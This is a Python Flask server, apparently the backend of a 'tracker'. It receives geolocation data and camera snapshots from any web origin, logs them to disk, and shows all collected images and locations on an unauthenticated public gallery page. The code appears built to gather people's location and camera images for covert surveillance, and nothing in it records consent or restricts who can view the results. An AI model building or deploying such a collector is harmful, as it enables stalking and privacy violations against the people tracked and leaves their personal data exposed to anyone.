from flask import Flask, request, send_from_directory, render_template_string
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

# Ensure required directories exist
os.makedirs("snapshots", exist_ok=True)

# ✅ Home route
@app.route("/")
def index():
    return "✅ Flask Tracker is Running"

# ✅ Handle geolocation data
@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    print("📍 Location Received:", data)
    with open("location_log.txt", "a") as f:
        f.write(f"{datetime.now()} - {data}\n")
    return "Location saved"

# ✅ Handle camera snapshot uploads
@app.route("/upload", methods=["POST"])
def upload():
    image = request.files["snapshot"]
    filename = f"snapshots/snapshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    image.save(filename)
    print(f"📸 Snapshot saved: {filename}")
    return "Snapshot saved"

# ✅ Serve specific snapshot by filename
@app.route("/snapshots/<filename>")
def get_snapshot(filename):
    return send_from_directory("snapshots", filename)

# ✅ View all snapshots and location logs
@app.route("/gallery")
def gallery():
    # Get list of snapshots
    snapshot_files = sorted(os.listdir("snapshots"))

    # Read location logs
    if os.path.exists("location_log.txt"):
        with open("location_log.txt", "r") as f:
            location_entries = f.readlines()
    else:
        location_entries = []

    # Basic HTML viewer
    html = """
    <html>
    <head><title>Live Tracker Gallery</title></head>
    <body>
      <h1>📸 Snapshots</h1>
      {% for file in snapshots %}
        <div style="margin-bottom:20px;">
          <img src="/snapshots/{{file}}" width="400"><br>
          <small>{{file}}</small>
        </div>
      {% endfor %}

      <h1>📍 Location Logs</h1>
      <pre>{{ locations }}</pre>
    </body>
    </html>
    """

    return render_template_string(html, snapshots=snapshot_files, locations="".join(location_entries))

# ✅ Start Flask server on the given PORT (Render requirement)
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
